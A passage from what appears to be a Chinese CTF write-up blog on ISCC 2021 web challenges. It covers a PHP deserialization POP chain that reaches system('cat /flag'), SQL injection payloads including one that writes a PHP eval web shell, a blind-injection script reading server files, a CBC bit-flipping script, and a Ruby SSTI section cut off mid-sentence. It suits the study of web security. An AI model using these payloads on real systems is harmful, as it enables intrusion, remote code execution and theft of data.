class="string">&#x27;name&#x27;</span>] === <span class="string">&#x27;isccIsCciScc1scc&#x27;</span>) &#123;</span><br><span class="line">            $cmd = <span class="keyword">$this</span>-&gt;new_cmd;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Login</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;login();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;logout();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $flag = file_get_contents(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        $pAssM0rd = hash(<span class="string">&quot;sha256&quot;</span>, $flag);</span><br><span class="line">        <span class="keyword">if</span>($_GET[<span class="string">&#x27;pAssM0rd&#x27;</span>] === $pAssM0rd)</span><br><span class="line">            $_SESSION[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&quot;isccIsCciScc1scc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        <span class="keyword">unset</span>($_SESSION[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $status = <span class="string">&quot;finish&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_TellMeTruth</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;name&#x27;</span>])) </span><br><span class="line">            $_SESSION[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;似乎这个 &quot;</span>.$_SESSION[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot; 是真相&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;似乎这个 &quot;</span>.$_SESSION[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot; 是真相&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Command</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $is_upload;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        $is_upload = <span class="literal">false</span>;</span><br><span class="line">        $cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;看看你干的好事: <span class="subst">&#123;$cmd&#125;</span> &lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        <span class="keyword">global</span> $is_unser_finished;</span><br><span class="line">        $status = <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>($is_unser_finished === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;看看你干的 [&lt;span style=&#x27;color:red&#x27;&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/span&gt;] 弄出了什么后果: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;span style=&#x27;color:blue&#x27;&gt;&quot;</span>;</span><br><span class="line">            @system($cmd);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/span&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randstr</span>(<span class="params">$len</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $characters = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_=&#x27;</span>;</span><br><span class="line">    $randstring = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        $randstring .= $characters[rand(<span class="number">0</span>, strlen($characters))];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $randstring;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(stripos($s, <span class="string">&quot;*&quot;</span>) !== <span class="literal">FALSE</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">finalize</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $cmd = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    $is_upload = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">    @unlink($iscc_file);</span><br><span class="line">    $status = <span class="string">&quot;finish&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;whichisthetrueiscc.gif&#x27;&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;whatareyounongshane&#x27;</span>])) &#123;</span><br><span class="line">    $whatareyounongshane = $_GET[<span class="string">&#x27;whatareyounongshane&#x27;</span>];</span><br><span class="line">    <span class="keyword">switch</span> ($whatareyounongshane) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;src&quot;</span>:</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;cmd&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;想越级干好事？还是有门的……&quot;</span>;</span><br><span class="line">            header(<span class="string">&#x27;Location: /?%3f=O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;reset&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;几辈子积累的好运就在这时~:p&quot;</span>;</span><br><span class="line">            header(<span class="string">&#x27;Location: /?%3f=O:13:&quot;ISCC_ResetCMD&quot;:1:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;upload&quot;</span>:</span><br><span class="line">            $resp = &lt;&lt;&lt;EOF</span><br><span class="line">&lt;form action=<span class="string">&quot;/index.php?%3f=O:11:%22ISCC_Upload%22:0:&#123;&#125;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;iscc_file&quot;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Upload Image&quot;</span> name=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">EOF;</span><br><span class="line">            <span class="keyword">echo</span> $resp;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;tellmetruth&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> base64_decode(<span class="string">&quot;PGltZyBzcmM9J3RlbGxtZXRydXRoLmdpZic+Cg==&quot;</span>);</span><br><span class="line">            header(<span class="string">&#x27;Location: /?%3f=O:14:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;空空如也就是我！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    finalize();</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;所以哪个ISCC是真的？&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;?&#x27;</span>])) &#123;</span><br><span class="line">    </span><br><span class="line">    $wtf = waf($_GET&#123;<span class="string">&#x27;?&#x27;</span>&#125;) ? $_GET[<span class="string">&#x27;?&#x27;</span>] : (finalize() &amp;&amp; <span class="keyword">die</span>(<span class="string">&quot;试试就“逝世”!&quot;</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>($goodshit = @unserialize($wtf)) &#123;</span><br><span class="line">        $is_unser_finished = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(in_array($status, <span class="keyword">array</span>(<span class="string">&#x27;new&#x27;</span>, <span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;upload_ok&#x27;</span>, <span class="string">&#x27;upload_fail&#x27;</span>, <span class="string">&#x27;reset&#x27;</span>), <span class="literal">true</span>))</span><br><span class="line">        finalize();</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;所以哪个ISCC是真的？&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>忘记保存了，重新复述一下吧审计完以后，可以知道我们的目的是执行system指令——》需要更改session[name]的值——》需要upload里面变量覆盖</p>
<p><strong>难点:</strong><br>1.每个类的wakeup函数都重新定义了session[name]，调用每个类的时候，肯定会使用到wakeup，如果当我们的session[name]刚被赋值完iscc…..就被赋值回去了，那就没用了，所以我们需要进行绕过<br>2.由于里面有protect变量，所以也需要绕过waf的过滤<br><strong>解决方案:</strong><br>1.wakeup的调用顺序是由内向外的，destruct的调用是由外向内的,所以我们以类似的嵌套方式（类似）来调用赋值，利用一个中间变量进行中转，这样及时最后用了wake_up函数也没事，因为我们已经执行完了<br>2.可以利用大写S来绕过对protected,private等属性的字符检测，也就是将序列化过程中小写s改为大写s，这样后面的内容我们就可以用十六进制进行表示了</p>
<p>POP链构造:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ISCC_Upload&#123;</span><br><span class="line">    public $x;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;x&#x3D;new ISCC_ResetCMD();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class ISCC_ResetCMD&#123;</span><br><span class="line">    public $x;</span><br><span class="line">    protected $new_cmd&#x3D;&#39;cat &#x2F;flag&#39;;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;x &#x3D; new ISCC_Command;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class ISCC_Command&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$b&#x3D;new ISCC_Upload();</span><br><span class="line">$a&#x3D;str_replace(&#39;s:10:&quot;&#39;.&quot;\x00*\x00&quot;,&#39;S:10:&quot;\00\2a\00&#39;,serialize($b));</span><br><span class="line">echo urlencode ($a);</span><br><span class="line">&#x2F;&#x2F;这个pop链的构造其实有点类似于嵌套，主要是为了绕过wakeup函数</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210503132753.png" alt="img" style="zoom:67%;">

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210503132758.png" alt="img" style="zoom:67%;">

<p><a href="https://github.com/ambionics/phpggc#advanced-enhancements">https://github.com/ambionics/phpggc#advanced-enhancements</a></p>
<h2 id="web——擂台题-easyweb"><a href="#web——擂台题-easyweb" class="headerlink" title="web——擂台题-easyweb"></a>web——擂台题-easyweb</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;and%0dsubstr((select%0dgroup_concat),1,1)&gt;&#39;0&#39;--%0d</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union%0dselect%0d1,&quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;%0dinto outfile%0d&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&#39;</span><br></pre></td></tr></table></figure>

<p>MySQL 5.6 及以上版本存在<code>innodb_index_stats</code>，<code>innodb_table_stats</code>两张表，其中包含新建立的库和表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select table_name from mysql.innodb_table_stats where database_name &#x3D; database();</span><br><span class="line">select table_name from mysql.innodb_index_stats where database_name &#x3D; database();</span><br></pre></td></tr></table></figure>

<p>在MySQL 5.7.9中sys中新增了一些视图，可以从中获取表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;包含in</span><br><span class="line">SELECT object_name FROM &#96;sys&#96;.&#96;x$innodb_buffer_stats_by_table&#96; where object_schema &#x3D; database();</span><br><span class="line">SELECT object_name FROM &#96;sys&#96;.&#96;innodb_buffer_stats_by_table&#96; WHERE object_schema &#x3D; DATABASE();</span><br><span class="line">SELECT TABLE_NAME FROM &#96;sys&#96;.&#96;x$schema_index_statistics&#96; WHERE TABLE_SCHEMA &#x3D; DATABASE();</span><br><span class="line">SELECT TABLE_NAME FROM &#96;sys&#96;.&#96;schema_auto_increment_columns&#96; WHERE TABLE_SCHEMA &#x3D; DATABASE();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;不包含in</span><br><span class="line">SELECT TABLE_NAME FROM &#96;sys&#96;.&#96;x$schema_flattened_keys&#96; WHERE TABLE_SCHEMA &#x3D; DATABASE();</span><br><span class="line">SELECT TABLE_NAME FROM &#96;sys&#96;.&#96;x$ps_schema_table_statistics_io&#96; WHERE TABLE_SCHEMA &#x3D; DATABASE();</span><br><span class="line">SELECT TABLE_NAME FROM &#96;sys&#96;.&#96;x$schema_table_statistics_with_buffer&#96; WHERE TABLE_SCHEMA &#x3D; DATABASE();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;通过表文件的存储路径获取表名</span><br><span class="line">SELECT FILE FROM &#96;sys&#96;.&#96;io_global_by_file_by_bytes&#96; WHERE FILE REGEXP DATABASE();</span><br><span class="line">SELECT FILE FROM &#96;sys&#96;.&#96;io_global_by_file_by_latency&#96; WHERE FILE REGEXP DATABASE();</span><br><span class="line">SELECT FILE FROM &#96;sys&#96;.&#96;x$io_global_by_file_by_bytes&#96; WHERE FILE REGEXP DATABASE();</span><br></pre></td></tr></table></figure>

<p>包含之前查询记录的表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT QUERY FROM sys.x$statement_analysis WHERE QUERY REGEXP DATABASE();</span><br><span class="line">SELECT QUERY FROM &#96;sys&#96;.&#96;statement_analysis&#96; where QUERY REGEXP DATABASE();</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT object_name FROM &#96;performance_schema&#96;.&#96;objects_summary_global_by_type&#96; WHERE object_schema &#x3D; DATABASE();</span><br><span class="line">SELECT object_name FROM &#96;performance_schema&#96;.&#96;table_handles&#96; WHERE object_schema &#x3D; DATABASE();</span><br><span class="line">SELECT object_name FROM &#96;performance_schema&#96;.&#96;table_io_waits_summary_by_index_usage&#96; WHERE object_schema &#x3D; DATABASE();</span><br><span class="line">SELECT object_name FROM &#96;performance_schema&#96;.&#96;table_io_waits_summary_by_table&#96; WHERE object_schema &#x3D; DATABASE();</span><br><span class="line">SELECT object_name FROM &#96;performance_schema&#96;.&#96;table_lock_waits_summary_by_table&#96; WHERE object_schema &#x3D; DATABASE();</span><br></pre></td></tr></table></figure>

<p>包含之前查询记录的表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT digest_text FROM &#96;performance_schema&#96;.&#96;events_statements_summary_by_digest&#96; WHERE digest_text REGEXP DATABASE();</span><br></pre></td></tr></table></figure>

<p>包含表文件路径的表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT file_name FROM &#96;performance_schema&#96;.&#96;file_instances&#96; WHERE file_name REGEXP DATABASE();</span><br></pre></td></tr></table></figure>

<p>使用<code>union select</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select c from (select 1 as a, 1 as b, 1 as c union select * from test)x limit 1 offset 1</span><br><span class="line">select &#96;3&#96; from(select 1,2,3 union select * from admin)a limit 1,1</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;无逗号，有join版本</span><br><span class="line">select a from (select * from (select 1 &#96;a&#96;)m join (select 2 &#96;b&#96;)n join (select 3 &#96;c&#96;)t where 0 union select * from test)x;</span><br></pre></td></tr></table></figure>

<p>盲注</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">((SELECT 1,concat(&#39;&#123;result+chr(mid)&#125;&#39;, cast(&quot;0&quot; as JSON)))&lt;(SELECT * FROM &#96;f1ag_1s_h3r3_hhhhh&#96;))</span><br></pre></td></tr></table></figure>

<p>要求后面select的结果必须是一行。mysql中对char型大小写是不敏感的，盲注的时候要么可以使用<code>hex</code>或者<code>binary</code>。<br> 这里只能使用<code>concat</code>将字符型和binary拼接，使之大小写敏感，<code>JSON</code>也可以使用<code>char byte</code>代替</p>
<p><code>mysql 8.0.19</code>新增语句<code>table</code><br> <a href="https://dev.mysql.com/doc/refman/8.0/en/table.html">https://dev.mysql.com/doc/refman/8.0/en/table.html</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</span><br></pre></td></tr></table></figure>

<p>可以把<code>table t</code>简单理解成<code>select * from t</code>，和<code>select</code>的区别在于</p>
<ul>
<li><code>table</code>总是显示表的所有列</li>
<li><code>table</code>不允许任何的行过滤;也就是说，<code>TABLE</code>不支持任何<code>WHERE</code>子句。<br> 可以用来盲注表名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;and\x0a(table\x0ainformation_schema.TABLESPACES_EXTENSIONS\x0alimit\x0a7,1)&gt;</span><br><span class="line">(BINARY(&#39;&#123;&#125;&#39;),&#39;0&#39;)#</span><br></pre></td></tr></table></figure>

<p>同时代替<code>select</code>被过滤导致只能同表查询的问题</p>
<p>PS：新增的<code>values</code>语句也挺有意思，在某些情况似乎可以代替<code>union</code>或<code>select</code>进行<code>order by</code>盲注</p>
<p>学习链接:<a href="https://www.cnblogs.com/20175211lyz/p/12358725.html">https://www.cnblogs.com/20175211lyz/p/12358725.html</a></p>
<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>一开始听说绝对路径var/www/html然后发现读取文件的权限很高，想说直接读读源码，发现不行，于是尝试尝试自己找找绝对路径:<br>包含根目录路径的文件:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;apache2&#x2F;sites-enabled&#x2F;000-default.conf</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=<span class="string">&quot;http://39.96.91.106:5001/?id=&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">database=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">    low =<span class="number">0</span></span><br><span class="line">    high=<span class="number">264</span></span><br><span class="line">    mid=(low+high)<span class="comment">//2</span></span><br><span class="line">    <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">        <span class="comment">#payload_1=f&quot;1/**/and/**/ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;&quot;</span></span><br><span class="line">        <span class="comment">#payload_2=f&quot;1/**/and/**/ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;ctf&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;&quot;</span></span><br><span class="line">        <span class="comment">#payload_3=f&quot;1/**/and/**/ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;flag&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;&quot;</span></span><br><span class="line">        <span class="comment">#payload_4= f&quot;1/**/and/**/ascii(substr((select/**/value/**/from/**/flag),&#123;i&#125;,1))&gt;&#123;mid&#125;&quot;</span></span><br><span class="line">        <span class="comment">#payload_1=f&quot;1&#x27;and%0dascii(substr((selselectect%0dgroup_concat(table_name)%0dfrom%0dmysql.innodb_table_stats%0dwhere%0ddatabase_name%0d=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;--%0d&quot;//iscc_flag</span></span><br><span class="line">        payload_3=f<span class="string">&quot;1&#x27;and%0dascii(substr((selselectect%0dload_file(&#x27;/etc/apache2/sites-enabled/000-default.conf&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;--%0d&quot;</span></span><br><span class="line">        payload_4 = f<span class="string">&quot;1&#x27;and%0dascii(substr((selselectect%0dload_file(&#x27;/var/www/const&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;--%0d&quot;</span></span><br><span class="line">       </span><br><span class="line">        <span class="comment"># print(s.get(url+payload_1).text)</span></span><br><span class="line">        <span class="comment"># print(payload_1)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> in s.get(url+payload_3).text:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high=mid</span><br><span class="line">        mid=(low+high)<span class="comment">//2</span></span><br><span class="line">    <span class="keyword">if</span>(mid==<span class="number">0</span> <span class="keyword">or</span> mid==<span class="number">264</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    database +=chr(mid)</span><br><span class="line">    <span class="keyword">print</span>(database)</span><br><span class="line"><span class="keyword">print</span>(database)</span><br></pre></td></tr></table></figure>



<h2 id="web——ISCC客服一号冲冲冲（二）"><a href="#web——ISCC客服一号冲冲冲（二）" class="headerlink" title="web——ISCC客服一号冲冲冲（二）"></a>web——ISCC客服一号冲冲冲（二）</h2><p>这题的考点在于CBC字节翻转攻击:<br>思路：他让我们登录，但是没有窗口，所以这里我们就自己post一个username和password，然后再burp回文里看到一个iv，一个cipher，想到以前做过的CBC字节翻转攻击，接下来就没啥区别了，唯一的不同的是password是客服题第一题的flag，需要替换一下，这里就贴一下脚本，具体的可以去之前的文章找找：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">cipher&#x3D;&quot;iThCcXSm90cuwxnw1KtfJqk%2Bled1cE%2Ba3xQh7UfgNovfWzCFOGmuryqdECjX1RqcLNv7ybOCRfXJBbokBfS4oKc5MnoFTbBfn5zTFdthy3E%3D&quot;</span><br><span class="line">iv&#x3D;&quot;dlp0Txccz%2Fba%2Fw0qSQGVjw%3D%3D&quot;</span><br><span class="line"></span><br><span class="line">cipher_de&#x3D;base64.b64decode(urllib.unquote(cipher))</span><br><span class="line">tran&#x3D;&#39;a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;bdmin&quot;;s:d&quot;;s:15:&quot;1SCC_2o2l_KeFuu&quot;&#125;8:&quot;passwor&#39;</span><br><span class="line"></span><br><span class="line">#tran[16:32]&#x3D;me&quot;;s:5:&quot;bdmin&quot;;</span><br><span class="line"></span><br><span class="line">cipher_new&#x3D;cipher_de[0:9]+chr(ord(cipher_de[9])^ord(&#39;b&#39;)^ord(&#39;a&#39;))+cipher_de[10:]</span><br><span class="line">cipher_new&#x3D;urllib.quote(base64.b64encode(cipher_new))</span><br><span class="line">print(cipher_new)</span><br><span class="line">cipher_new&#x3D;base64.b64decode(&#39;GgadNOlPvXYl8SxK+NWkK21lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjE1OiIxU0NDXzJvMmxfS2VGdXUiO30&#x3D;&#39;)</span><br><span class="line">print(cipher_new)</span><br><span class="line">iv_raw&#x3D;base64.b64decode(urllib.unquote(iv))</span><br><span class="line">iv_new&#x3D;&#39;&#39;</span><br><span class="line">for i in range(0,16):</span><br><span class="line">#</span><br><span class="line">	       iv_new+&#x3D;chr(ord(tran[i])^ord(iv_raw[i])^ord(cipher_new[i]))</span><br><span class="line">iv_new&#x3D;urllib.quote(base64.b64encode(iv_new))</span><br><span class="line">print(iv_new)</span><br></pre></td></tr></table></figure>

<h2 id="web——Explore-Ruby"><a href="#web——Explore-Ruby" class="headerlink" title="web——Explore Ruby"></a>web——Explore Ruby</h2><p>一开始没注意到有提示说demo是可以登陆的，就在尝试伪造cookie（太菜了），然后登录后，发现存在ssti注入<br><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911174631687-758048107.png" alt="img" style="zoom:67%;"><br>尝试了一下 发现是slim的ruby注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#&#123;7*7&#125;</span><br></pre></td></tr></table></figure>

<p>尝试读取继承，发现没有什么有用的内容，但是发现()等内容被过滤了，于是寻找替代品</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[:to_json, :instance_variable_set, :instance_variable_defined?, :remove_instance_variable, :instance_of?, :kind_of?, :is_a?, :tap, :instance_variable_get, :public_methods, :instance_variables, :method, :public_method, :define_singleton_method, :singleton_method, :public_send, :extend, :to_enum, :enum_for, :pp, :gem, :&lt;&#x3D;&gt;, :&#x3D;&#x3D;&#x3D;, :&#x3D;~, :!~, :eql?, :respond_to?, :freeze, :inspect, :object_id, :send, :to_s, :display, :nil?, :hash, :class, :singleton_class, :clone, :dup, :yield_self, :itself, :tainted?, :taint, :untrust, :untaint, :trust, :untrusted?, :methods, :frozen?, :singleton_methods, :protected_methods, :private_methods, :!, :equal?, :instance_eval, :&#x3D;&#x3D;, :instance_exec, :!&#x3D;, :__id__, :__send__]</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[:to_json, :instance_variable_set, :instance_variable_defined?, :remove_instance_variable, :instance_of?, :kind_of?, :is_a?, :tap, :instance_variable_get, :public_methods, :instance_variables, :method, :public_method, :define_singleton_method, :singleton_method, :public_send, :extend, :to_enum, :enum_for, :pp, :gem, :&lt;&#x3D;&gt;, :&#x3D;&#x3D;&#x3D;, :&#x3D;~, :!~, :eql?, :respond_to?, :freeze, :inspect, :object_id, :send, :to_s, :display, :nil?, :hash, :class, :singleton_class, :clone, :dup, :yield_self, :itself, :tainted?, :taint, :untrust, :untaint, :trust, :untrusted?, :methods, :frozen?, :singleton_methods, :protected_methods, :private_methods, :!, :equal?, :instance_eval, :&#x3D;&#x3D;, :instance_exec, :!&#x3D;, :__id__, :__send__]</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">object:47312658352300</span><br></pre></td></tr></table></figure>

<p>以上均为类继承读到的无用信息，发现几篇文章:<br><a href="https://blog.csdn.net/watkinsong/article/details/7968550">https://blog.csdn.net/watkinsong/article/details/7968550</a><br><a href="https://www.huaweicloud.com/articles/b5b475ca729307885cd91f03c46d4826.html">https://www.huaweicloud.com/articles/b5b475ca729307885cd91f03c46d4826.html</a></p>
<p>其中让人感兴趣的就是%x可以执行shell命令：<br>虽然中括号被过滤，但是<br><a href="https://qastack.cn/programming/665576/what-are-those-pipe-symbols-for-in-ruby">https://qastack.cn/programming/665576/what-are-those-pipe-symbols-for-in-ruby</a></p>
<p>可以利用管道符||进行绕过，构造payload:</p>
